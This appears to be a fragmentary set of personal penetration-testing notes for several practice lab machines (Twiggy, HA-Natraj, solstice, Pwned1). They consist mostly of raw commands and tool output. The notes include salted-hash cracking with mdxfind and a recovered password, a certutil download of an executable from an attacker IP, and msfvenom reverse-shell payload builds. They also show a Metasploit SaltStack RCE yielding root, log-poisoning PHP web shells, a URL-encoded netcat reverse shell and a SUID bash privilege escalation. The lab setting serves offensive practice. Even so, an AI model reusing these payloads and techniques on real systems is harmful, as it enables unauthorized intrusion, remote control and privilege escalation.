SHA1SHA1RAWMD5MD5MD5 SHA1MD51SALTMD5 SHA1MD5<br />x MD5SHA1SHA1MD5 MD5SHA1SHA1 MD5SQL5MD5 MD5SQL5-chop40 MD5-2xMD5 MD5-2xMD5-MD5 MD5-2xMD5-SHA1 MD5-2xMD5-MD5MD5 MD5-2xMD5-MD5MD5MD5 SHA1MD5USER SHA1MD5RADMIN2 SHA11SALTMD5 MD5-3xMD5 MD5-3xMD<br />5-MD5 MD5-3xMD5-SHA1 MD5-3xMD5-MD5MD5 MD5-3xMD5-MD5MD5MD5 SHA1-2xSHA1-MD5 SHA1-2xSHA1-MD5MD5 SHA1-2xSHA1-MD5MD5MD5 MD5-1xMD5SHA1 MD5-1xSHA1MD5 SHA1-1xSHA1MD5 SHA1-1xMD5SHA1 MD5-1xMD5SHA1-MD<br />5 MD5-1xSHA1MD5-MD5 MD5-1xMD5SHA1-MD5MD5 MD5-1xSHA1MD5-MD5MD5 MD5-1xSHA1MD5pSHA1p SHA1-1xSHA1MD5pSHA1p MD5SHA1-1xSHA1MD5pSHA1p MD5revp MD5TIGER2 MD5SHA1MD5MD5 MD5SHA1MD5RADMIN2 MD5SHA1MD5MD<br />5MD5SHA1 MD5SHA1RAW MD5SHA1MD5MD5MD5 MD5SQL5-32 MD51SALTMD5MD5MD5 MD51SALTMD5MD5MD5MD5 MD51SALTMD5MD5MD5MD5MD5 MD5BASE64ROT13 MD5MD5SALT MD52SALTMD5MD5 MD52SALTMD5MD5MD5 MD5UCSALT MD5TIGER <br />MD5SHA1MD5PASS MD5CAP MD5CAPMD5USER MD5CAPMD5MD5USER MD5MD5MD5USER MD5MD5SALT:SALT MD5CAPSHA1 MD5SHA1MD5x MD5SHA1BASE64MD5RAW MD5SHA1MD5MD5SHA1 MD5SHA1MD5UC MD5MD5HUM SHA1MD5HUM MD5SHA1HUM <br />MD5-MD5SALTMD5PASS MD5NTLM MD5MD4 MD5NTLMUC MD5USERPASS MD5PASSSALT MD5SHA1RADMIN2MD5 MD5UCBASE64MD5RAW MD5UCBASE64SHA1RAW MD5SHA1MD5MD5UC MD5SHA1MD5HUM MD5LM MD5LMUC MD5RAWUC MD5SHA1UCu32 <br />MD5SALTPASS MD5MD5UCSHA1MD5MD5 MD5SHA256MD5 MD5-2xMD5UC MD5-4xMD5 MD5-SHA1numSHA1 MD5-2xSHA1 SHA1-2xMD5 SHA256MD5SALTPASS MD5padMD5 MD5DSALT MD5SALTPASSSALT MD5-MD5SHA1MD5SHA1MD5SHA1p MD5MD<br />5UCSQL3p MD5MD5UCp MD5NTLMp MD5-MD5USERSHA1MD5PASS MD5SHA1u32SALT MD5-LMNTLM MD5-MD5psSHA1MD5psp MD5-MD5puSHA1MD5pup MD5WRLMD5 MD5AM MD5AM2 MD5SWAP MD5SPECAM MD5HESK MD5SHA1SALTMD5PASS MD5S<br />ALTMD5PASS MD5SHA1PASSMD5PASSSHA1PASS MD5SHA1PASSSALT MD5SQL3 BCRYPTMD5 MD5sub8-24MD5 MD5sub8-24MD5sub8-24MD5 MD5-MD5PASSMD5SALT MD5revMD5SHA1 MD5SHA1BASE64SHA1MD5 SHA1revMD5 SHA1-MD5SALT S<br />HA1-revMD5SALT SHA1revMD5PASSSALT SHA1MD5PASSSALT SHA1-MD5MD5SALT SHA1MD5PASS-SALT SHA1SALTMD5PASS SHA1SALTrevMD5PASS SHA1WRLMD5 SHA1MD5SHA1MD5SHA1MD5SHA1 MD5GOST MD5GOSTMD5 MD5GOSTMD5UC MD<br />5WRLRAW MD5-4xMD5-SALT MD4SHA1MD5 MD5RAWMD5RAW MD5SHA1BASE64SHA1RAW MD5revMD5SHA1SHA1 MD5MD2 MD5MD2RAW MD5BASE64SHA256RAW MD4UTF16MD5 MD5SHA0 MD5DESCRYPT MD5PASSSHA1MD5 MD5PASSMD5MD5PASS MD<br />5PASSMD5MD5MD5 MD5-MD5PASSMD5 MD5PASSSHA1 MD5MD5PASSSHA1 SHA1MD5MD5SHA1MD5SHA1SHA1MD5 MD5CRYPT SHA512SALTMD5 MD5-SALTMD5PASSSALT MD5-SALTMD5SALTPASS MD5-MD5PASS-SALT MD5-MD5SALT-PASS MD5-PA<br />SS-MD5SALT MD5SHA1MD5SHA1MD5SHA1MD5SHA1MD5SHA1MD5SHA1 MD5dcab MD5bcad MD5BASE64BASE64 MD5BASE64BASE64BASE64 MD5-SALTSHA1SALTPASS PBKDF2-MD5                                                  <br />1 total salts in use                                                                                                                                                                         <br />Generated 19998 Userids                                                                                                                                                                      <br />Reading hash list from stdin...                                                                                                                                                              <br />Took 0.00 seconds to read hashes                                                                                                                                                             <br />Searching through 1 unique hashes from &lt;STDIN&gt;                                                                                                                                               <br />Maximum hash chain depth is 1                                                                                                                                                                <br />Minimum hash length is 32 characters                                                                                                                                                         <br />Using 4 cores                                                                                                                                                                                <br />MD5PASSSALTx02 a2b4e80cd640aaa6e417febe095dcbfc:YOUR_SALT_HERE:wazowski <br /><br /><br />echo &quot;844ffc2c7150b93c4133a6ff2e1a2dba&quot; | ./mdxfind -h &#39;MD5PASSSALT&#39; -s salt.txt /usr/share/wordlists/rockyou.txt -i 2 <br />1 salts read from salt.txt<br />Iterations set to 2<br />Working on hash types: MD5PASSSALT SHA1revMD5PASSSALT SHA1MD5PASSSALT MD5-SALTMD5PASSSALT <br />1 total salts in use<br />Reading hash list from stdin...<br />Took 0.00 seconds to read hashes<br />Searching through 1 unique hashes from &lt;STDIN&gt;<br />Maximum hash chain depth is 1<br />Minimum hash length is 32 characters<br />Using 4 cores<br />MD5PASSSALTx02 844ffc2c7150b93c4133a6ff2e1a2dba:YOUR_SALT_HERE:Mike14<br /><br />mike:Mike14<br /><br />certutil.exe -urlcache -split -f <a href="http://192.168.49.235/whiskey.exe">http://192.168.49.235/whiskey.exe</a><br /><br /><br />msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.14.10.119 LPORT=6667 -f exe -o whiskey.exe<br /><br />We open PowerShell to take a quick look around and discover XAMPP running out of <strong>C:\xampp</strong>. Within that directory, we find <strong>properties.ini</strong>.<br /><br />CVE-2020-11107 (admin checks logs autmoatically after a few minutes, only executed the exe file for some reason, bat file did not work?)<br /><br /><br />msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.80 LPORT=6666 -f exe -o elevate.exe<br /></div><div class='page'><h1 class='title level-2'>Quackerjack.pg</h1><br/></div><div class='page'><h1 class='title level-2'>Twiggy.pg</h1><br/>└─# nmap -sV -sC  192.168.178.62   -p-      <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-09-29 00:14 +03<br />Nmap scan report for 192.168.178.62<br />Host is up (0.15s latency).<br />Not shown: 65529 filtered ports<br />PORT     STATE SERVICE VERSION<br />22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)<br />|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)<br />|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)<br />53/tcp   open  domain  NLnet Labs NSD<br />80/tcp   open  http    nginx 1.16.1<br />|_http-server-header: nginx/1.16.1<br />|_http-title: Home | Mezzanine<br />4505/tcp open  zmtp    ZeroMQ ZMTP 2.0<br />4506/tcp open  zmtp    ZeroMQ ZMTP 2.0<br />8000/tcp open  http    nginx 1.16.1<br />|_http-open-proxy: Proxy might be redirecting requests<br />|_http-server-header: nginx/1.16.1<br />|_http-title: Site doesn&#39;t have a title (application/json).<br /><br />msf6 exploit(linux/misc/saltstack_salt_unauth_rce) &gt; show options<br /><br />Module options (exploit/linux/misc/saltstack_salt_unauth_rce):<br /><br />   Name      Current Setting  Required  Description<br />   ----      ---------------  --------  -----------<br />   MINIONS   .*               yes       PCRE regex of minions to target<br />   RHOSTS    192.168.178.62   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;<br />   ROOT_KEY                   no        Master&#39;s root key if you have it<br />   RPORT     4506             yes       The target port (TCP)<br />   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the loca<br />                                        l machine or 0.0.0.0 to listen on all addresses.<br />   SRVPORT   8000             yes       The local port to listen on.<br />   SSL       false            no        Negotiate SSL for incoming connections<br />   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)<br />   URIPATH                    no        The URI to use for this exploit (default is random)<br /><br /><br />Payload options (cmd/unix/reverse_python_ssl):<br /><br />   Name   Current Setting  Required  Description<br />   ----   ---------------  --------  -----------<br />   LHOST  192.168.49.178   yes       The listen address (an interface may be specified)<br />   LPORT  80               yes       The listen port<br /><br /><br />Exploit target:<br /><br />   Id  Name<br />   --  ----<br />   1   Master (Unix command)<br /><br />whoami<br />root</div><div class='page'><h1 class='title level-2'>HA-Natraj.pg</h1><br/><br /><h2>RCE with LFI and SSH Log Poisoning</h2><br /><br /><br />PORT   STATE SERVICE REASON         VERSION<br />22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+Gv/kpy3r+s15xcQ3TABj4bHKW6cfSBW4Nm8UutdX8W6JJam+7EOpwOpbsItLbkm2nrWEB72D47z5ayx63Hn+e8qGn8Vw9yzZS0z2JSMOWyeYVEYM4G9dPZlUJavoOOe4zrWiiZtj3IbMZy1wnjhaEgne5sC27o+1a73+Lgwz/xik+XtlCEUyxK+RnUa7dEEF9HIy+5B2qptnrUdISLDzXMwUFRlXM7GlA84Y8X0DLs90YNaDCxnvjkp5VOTIWDKtt78U+9ClEgWMkfHGSpiuvGMm1AHCkFPLtNfDoF6pYm2lOI4Lv090Ce/TRqBFCPq1oL6MrpkSpq6tXhEh4wox<br />|   256 bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)<br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN7p17tEdnU25MlcknnznQEFmFu3wnoXy7Tam4z8/7sv+l/G3FkLJkfyeRCHMo5Y+z6rGNfB1Zt9jshB8TDkdCg=<br />|   256 f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPugHptbBU0i1SJ0DkVvuyGN9HsQf0GzlPTdJYJqKE+U<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))<br />| http-methods: <br />|_  Supported Methods: GET POST OPTIONS HEAD<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: HA:Natraj<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />Aggressive OS guesses: Linux 3.10 - 3.12 (93%), Linux 4.4 (93%), Linux 4.9 (92%), Linux 4.0 (92%), Linux 3.10 - 4.11 (90%), Linux 3.11 - 4.1 (90%), Linux 3.16 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%), Linux 2.6.32 or 3.10 (90%)<br />No exact OS matches for host (test conditions non-ideal).<br />TCP/IP fingerprint:<br />SCAN(V=7.91%E=4%D=7/24%OT=22%CT=%CU=41094%PV=Y%DS=2%DC=T%G=N%TM=60FC5489%P=x86_64-pc-linux-gnu)<br />SEQ(SP=FF%GCD=1%ISR=101%TI=Z%TS=A)<br />OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)<br />WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)<br />ECN(R=Y%DF=Y%T=40%W=7210%O=M506NNSNW7%CC=Y%Q=)<br />T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />T2(R=N)<br />T3(R=N)<br />T4(R=N)<br />T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)<br />IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Uptime guess: 16.490 days (since Thu Jul  8 09:11:40 2021)<br />Network Distance: 2 hops<br />TCP Sequence Prediction: Difficulty=255 (Good luck!)<br />IP ID Sequence Generation: All zeros<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 22/tcp)<br />HOP RTT       ADDRESS<br />1   151.35 ms 192.168.49.1<br />2   150.63 ms 192.168.170.80<br /><br /><br />ssh &#39;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#39;@192.168.170.80<br /><br />ssh &#39;&lt;?php system($_GET[&#39;c&#39;]); ?&gt;&#39;@192.168.170.80<br /><br />en aşağı bak logun<br />view-source:<a href="http://192.168.170.80/console/file.php?file=/var/log/auth.log&c=ifconfig">http://192.168.170.80/console/file.php?file=/var/log/auth.log&amp;c=ifconfig</a><br /><br /><br />/var/log/auth.log writable <br />use exploit/multi/script/web_delivery<br /><br />msf6 exploit(multi/script/web_delivery) &gt; set target 1<br />target =&gt; 1<br />msf6 exploit(multi/script/web_delivery) &gt; set lhost tun0<br />lhost =&gt; 192.168.49.170<br />msf6 exploit(multi/script/web_delivery) &gt; set lport 6666<br />lport =&gt; 6666<br />msf6 exploit(multi/script/web_delivery) &gt; set srvhost 192.168.170.80<br />srvhost =&gt; 192.168.170.80<br />msf6 exploit(multi/script/web_delivery) &gt; set srvhost 0.0.0.0<br />srvhost =&gt; 0.0.0.0<br /><br />set srvport 8081<br /><br />msf6 exploit(multi/script/web_delivery) &gt; show options<br /></div><div class='page'><h1 class='title level-2'>solstice.pg</h1><br/>PORT      STATE SERVICE REASON         VERSION<br />21/tcp    open  ftp     syn-ack ttl 63 pyftpdlib 1.5.6<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|  Connected to: 192.168.170.72:21<br />|  Waiting for username.<br />|  TYPE: ASCII; STRUcture: File; MODE: Stream<br />|  Data connection closed.<br />|_End of status.<br />22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWAl1JMEsT6kbFmhkFFIZbd2aH3DuBpmLjo1MvWSSFsUlQ+rN9wQ8y469ng7vKZDx19ke+JZ9jUcuJAu4zQ6BHjHDcLTy44WJCESD4oACMCK6+tlMneuINf6KTMr3urfvkvlULi2ffNbMl6Ko9gS/Oqh8Cm9HyAXGTK5MVgmW39QFTXdn7ByQMnnXjKmJ+5nXbf9c9Al9JJCFQAe0irCq2w3ubylh83SwPWsunapn0pW8Czsm2nsFL6aRXCOoNeK7/GmcC8lqENMnUIVRauhpDR3radZ4Uv4ejzHL8H+IklpgVRqBiuzRiqHpGlotNYadcArbYZ4auDwibrtRwgTlD<br />|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)<br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9EuXzK3hXcn3ml6Kj69Bo1DACMk1AZWWm9wgPGIyPBQyQLXLazAtoqEP1phT1BNmtyAvScCwsydQwUsRH/3vA=<br />|   256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATUyTSmh1Tep0cnIVXvQBD6IQTjI8TBEmQEba1Fzkv2<br />25/tcp    open  smtp    syn-ack ttl 63 Exim smtpd<br />| smtp-commands: solstice Hello nmap.scanme.org [192.168.49.170], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, <br />|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP <br />80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))<br />| http-methods: <br />|_  Supported Methods: POST OPTIONS HEAD GET<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />2121/tcp  open  ftp     syn-ack ttl 63 pyftpdlib 1.5.6<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_drws------   2 www-data www-data     4096 Jun 18  2020 pub<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|  Connected to: 192.168.170.72:2121<br />|  Waiting for username.<br />|  TYPE: ASCII; STRUcture: File; MODE: Stream<br />|  Data connection closed.<br />|_End of status.<br />8593/tcp  open  http    syn-ack ttl 63 PHP cli server 5.5 or later (PHP 7.3.14-1)<br />| http-cookie-flags: <br />|   /: <br />|     PHPSESSID: <br />|_      httponly flag not set<br />| http-methods: <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />54787/tcp open  http    syn-ack ttl 63 PHP cli server 5.5 or later (PHP 7.3.14-1)<br />| http-methods: <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />62524/tcp open  ftp     syn-ack ttl 63 FreeFloat ftpd 1.00<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />Aggressive OS guesses: Linux 2.6.18 (91%), Linux 4.15 - 5.6 (90%), Linux 5.0 - 5.4 (90%), Linux 2.6.32 (90%), Linux 2.6.32 or 3.10 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 3.7 (90%)<br />No exact OS matches for host (test conditions non-ideal).<br />TCP/IP fingerprint:<br />SCAN(V=7.91%E=4%D=7/24%OT=21%CT=%CU=40575%PV=Y%DS=2%DC=T%G=N%TM=60FC76E6%P=x86_64-pc-linux-gnu)<br />SEQ(SP=103%GCD=2%ISR=10B%TI=Z%TS=A)<br />OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)<br />WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br />ECN(R=Y%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)<br />T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />T2(R=N)<br />T3(R=N)<br />T4(R=N)<br />T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)<br />IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Uptime guess: 22.594 days (since Fri Jul  2 09:08:40 2021)<br />Network Distance: 2 hops<br />TCP Sequence Prediction: Difficulty=260 (Good luck!)<br />IP ID Sequence Generation: All zeros<br /><br /><br /><br />nc 192.168.170.72 80<br /><br /><code>GET /&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt; HTTP/1.1</code><br /><code>Host: </code>192.168.170.72<br /><code>Connection: close</code><br /><br /><br /><br /><br />/var/log/apache2/access.log&amp;cmd=id<br /><br />URL ENCODE requests!!!!!!<br /><a href="https://www.urlencoder.org/">https://www.urlencoder.org/</a><br />cd .. &amp;&amp; ls -la<br />/var/log/apache2/access.log&amp;cmd=cd%20..%20%26%26%20ls%20-la<br /><br /><br /><br />/var/log/apache2/access.log&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.49.196%206666%20%3E%2Ftmp%2Ff<br /><br /><br />If we review the running processes, we’ll find a local web server running as root.<br /><code>www-data@solstice:/var/tmp/webserver$ ps aux<br />ps aux<br />USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br />...<br />root       474  0.0  0.0   2388   756 ?        Ss   Aug11   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/<br />...<br />root       480  0.0  2.0 196744 21104 ?        S    Aug11   0:01 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/<br />...<br /></code><br /><br /><br />www-data@solstice:/var/tmp/sv$ ls -la<br />ls -la<br />total 12<br />drwsrwxrwx 2 root root 4096 Jun 26  2020 .<br />drwxrwxrwt 9 root root 4096 Sep  6 14:39 ..<br />-rwxrwxrwx 1 root root   36 Jun 19  2020 index.php<br /><br /><br /><br /><br />printf &quot;&lt;?php\nsystem(&#39;chmod o+x /bin/bash; chmod +s /bin/bash&#39;);\n?&gt;&quot; &gt; index.php<br /><br />curl localhost:57<br /><br />/bin/bash -p</div><div class='page'><h1 class='title level-2'>Pwned1.pg</h1><br/><br /><br />.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br />| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |<br />| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br />`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;<br />The Modern Day Port Scanner.<br />________________________________________<br />: <a href="https://discord.gg/GFrQsGy">https://discord.gg/GFrQsGy</a>           :<br />: <a href="https://github.com/RustScan/RustScan">https://github.com/RustScan/RustScan</a> :<br /> --------------------------------------<br />😵 <a href="https://admin.tryhackme.com">https://admin.tryhackme.com</a><br /><br />[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br />[~] Automatically increasing ulimit value to 5000.<br />Open 192.168.225.95:22<br />Open 192.168.225.95:21<br />Open 192.168.225.95:80<br />[~] Starting Script(s)<br />[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)<br /><br />[~] Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-09-09 22:33 +03<br />NSE: Loaded 153 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 0.00s elapsed<br />Initiating Ping Scan at 22:33<br />Scanning 192.168.225.95 [4 ports]<br />Completed Ping Scan at 22:33, 0.19s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 22:33<br />Completed Parallel DNS resolution of 1 host. at 22:33, 0.02s elapsed<br />DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]<br />Initiating SYN Stealth Scan at 22:33<br />Scanning 192.168.225.95 [3 ports]<br />Discovered open port 21/tcp on 192.168.225.95<br />Discovered open port 80/tcp on 192.168.225.95<br />Discovered open port 22/tcp on 192.168.225.95<br />Completed SYN Stealth Scan at 22:33, 0.18s elapsed (3 total ports)<br />Initiating Service scan at 22:33<br />Scanning 3 services on 192.168.225.95<br />Completed Service scan at 22:33, 6.33s elapsed (3 services on 1 host)<br />Initiating OS detection (try #1) against 192.168.225.95<br />Retrying OS detection (try #2) against 192.168.225.95<br />Initiating Traceroute at 22:33<br />Completed Traceroute at 22:33, 0.16s elapsed<br />Initiating Parallel DNS resolution of 2 hosts. at 22:33<br />Completed Parallel DNS resolution of 2 hosts. at 22:33, 0.02s elapsed<br />DNS resolution of 2 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]<br />NSE: Script scanning 192.168.225.95.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 4.62s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 1.07s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 0.00s elapsed<br />Nmap scan report for 192.168.225.95<br />Host is up, received reset ttl 63 (0.15s latency).<br />Scanned at 2021-09-09 22:33:37 +03 for 18s<br /><br />PORT   STATE SERVICE REASON         VERSION<br />21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3<br />22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQPyAx8qSGlWyyuL5xu/6lWdbWs6VArMlRC71wt11kYKMGUTuVmPvLAdSAL66haaz0DCvquZMOmeYNHvM7/OjfmkwlIt3Wv53q/23AODRwPGkpj00QCNH/Vqt6Aw94Afo3etyW9SU3vzLC2F3mS18cqXApmV90NIH3d6ayhsDP+aPuQFoFqEzDxzy2RkosueaEERECT0auT+pTIwRMCHBEVX98Srd8+ax1yhWITRTGOYXcdocx0m9tooFUEH/a1P3RK3gBzCL63ZejMN9YofBl8y+CwCt+0nBLg+PtNjjskD9CaBwxUmH0/UM24z9BQecPn3IFmm3+P5U0z1DQEhf<br />|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)<br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDHWpwgF92XD4REIANL7X9lMcQSwcbhlNqwBvNi8l4SzQn5MjSzlBQzgcC7Kro57lCr0kImH+XdijG+r6lyps70=<br />|   256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHPgRt1LF33Ttn5DuGuJJpmgbMd2ofAkqEt6gTOQK+WW<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))<br />| http-methods: <br />|_  Supported Methods: OPTIONS HEAD GET POST<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Pwned....!!<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />Aggressive OS guesses: Linux 4.15 - 5.6 (90%), Linux 2.6.32 (90%), Linux 2.6.32 or 3.10 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 3.4 (90%), Linux 3.7 (90%), Linux 4.4 (90%), Synology DiskStation Manager 5.1 (90%), Linux 2.6.18 (90%)<br />No exact OS matches for host (test conditions non-ideal).<br />TCP/IP fingerprint:<br />SCAN(V=7.91%E=4%D=9/9%OT=21%CT=%CU=40662%PV=Y%DS=2%DC=T%G=N%TM=613A61A3%P=x86_64-pc-linux-gnu)<br />SEQ(SP=103%GCD=1%ISR=10F%TI=Z%II=I%TS=A)<br />OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)<br />WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br />ECN(R=Y%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)<br />T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />T2(R=N)<br />T3(R=N)<br />T4(R=N)<br />T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)<br />IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Uptime guess: 34.312 days (since Fri Aug  6 15:05:18 2021)<br />Network Distance: 2 hops<br />TCP Sequence Prediction: Difficulty=259 (Good luck!)<br />IP ID Sequence Generation: All zeros<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 443/tcp)<br />HOP RTT       ADDRESS<br />1   152.21 ms 192.168.49.1<br />2   148.23 ms 192.168.225.95<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 22:33<br />Completed NSE at 22:33, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds<br />           Raw packets sent: 79 (5.360KB) | 